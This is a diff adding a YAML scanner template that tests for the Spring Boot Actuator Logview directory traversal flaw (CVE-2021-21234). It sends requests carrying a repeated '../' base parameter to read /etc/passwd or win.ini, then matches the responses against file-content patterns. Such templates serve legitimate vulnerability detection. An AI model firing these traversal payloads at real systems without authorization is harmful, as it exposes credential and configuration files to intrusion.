@@ -1,0 +1,68 @@
+id: SPRING_BOOT_ACTUATOR_LOGVIEW_TRAVERSAL
+info:
+  name: "Spring Boot Actuator Logview Directory Traversal"
+  description: "This vulnerability allows attackers to exploit the Logview component by accessing files outside the intended directories. By manipulating file paths, attackers can view sensitive files on the server, which may include configuration files, log data, or other critical system information. This vulnerability exposes sensitive data and can lead to further attacks or system compromise."
+  details:  "This vulnerability arises when the Logview component fails to properly validate and sanitize user-supplied file paths. Attackers can exploit this flaw by injecting directory traversal sequences (e.g., `../`) to access files outside of the intended directory. This can lead to unauthorized exposure of sensitive files such as configuration settings or logs, potentially revealing critical system information and increasing the risk of further exploitation."
+  impact: "The impact of this vulnerability is significant as it allows attackers to access sensitive files on the server. This unauthorized access can expose configuration details, sensitive logs, or other critical information, potentially leading to data breaches or further attacks. Compromised files may provide insights into the application's internals or system environment, increasing the risk of additional security issues."
+  category:
+    name: SM
+    shortName: Misconfiguration
+    displayName: Security Misconfiguration (SM)
+  subCategory: SPRING_BOOT_ACTUATOR_LOGVIEW_TRAVERSAL
+  severity: MEDIUM
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
+  cwe:
+    - CWE-200
+    - CWE-16
+  cve:
+    - CVE-2021-21234
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+wordLists:
+  queryParamsList:
+    - "/windows/win.ini"
+    - "/etc/passwd"
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_method: GET
+      - modify_url: "/manage/log/view"
+      - add_query_param:
+          filename: ${queryParamsList}
+      - add_query_param:
+          base: "../../../../../../../../../../"
+      - replace_body: '{}'
+      
+validate:
+  response_code:
+    eq: 200
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "text/plain"
+  or:
+    - response_payload:
+        length:
+          gt: 0
+        regex: "root:.*:0:0:"
+    - response_payload:
+        length:
+          gt: 0
+        contains_all:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
